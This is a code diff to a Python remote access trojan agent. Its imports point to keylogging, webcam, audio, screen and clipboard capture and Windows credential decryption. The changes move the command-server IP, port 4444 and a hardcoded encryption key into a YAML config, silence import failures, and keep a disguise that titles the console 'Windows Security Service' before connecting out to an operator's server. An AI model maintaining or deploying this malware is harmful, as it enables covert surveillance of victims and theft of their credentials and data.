@@ -9,7 +9,6 @@ import socket
 import subprocess
 import os
 import sys
-import winreg
 import ctypes
 import base64
 import threading
@@ -23,22 +22,63 @@ import random
 import string
 from io import BytesIO
 from datetime import datetime
+import sys
+sys.path.insert(0, os.path.dirname(__file__))
+
+# Configuration
+try:
+    from master_umbrella_setup import get_yaml_config, config_get
+    config = get_yaml_config()
+    CALLBACK_IP = config.get('agent.callback_ip', '127.0.0.1')
+    CALLBACK_PORT = config.get('agent.callback_port', 4444)
+    ENCRYPTION_KEY = config.get('agent.encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=').encode() if isinstance(config.get('agent.encryption_key', ''), str) else config.get('agent.encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=')
+except:
+    CALLBACK_IP = '127.0.0.1'
+    CALLBACK_PORT = 4444
+    ENCRYPTION_KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='
 
 # External libraries
 try:
     from cryptography.fernet import Fernet
     import mss
     import mss.tools
-    from pynput import keyboard
-    import cv2
-    import psutil
-    import pyaudio
-    import wave
-    import pyperclip
-    from PIL import Image
-    import numpy as np
-    import win32crypt
-    import requests
+    try:
+        from pynput import keyboard
+    except:
+        pass
+    try:
+        import cv2
+    except:
+        pass
+    try:
+        import psutil
+    except:
+        pass
+    try:
+        import pyaudio
+        import wave
+    except:
+        pass
+    try:
+        import pyperclip
+    except:
+        pass
+    try:
+        from PIL import Image
+    except:
+        pass
+    try:
+        import numpy as np
+    except:
+        pass
+    try:
+        import win32crypt
+    except:
+        pass
+    try:
+        import requests
+    except:
+        pass
 except ImportError:
     pass
 
@@ -1439,9 +1479,9 @@ def connect_to_server(host, port, key):
 # ═══════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
-    HOST = "192.168.1.201"  # CHANGE TO YOUR SERVER IP
-    PORT = 4444
-    KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='  # CHANGE TO YOUR KEY
+    HOST = CALLBACK_IP      # From umbrella_config.yaml
+    PORT = CALLBACK_PORT    # From umbrella_config.yaml
+    KEY = ENCRYPTION_KEY    # From umbrella_config.yaml
     
     try:
         ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
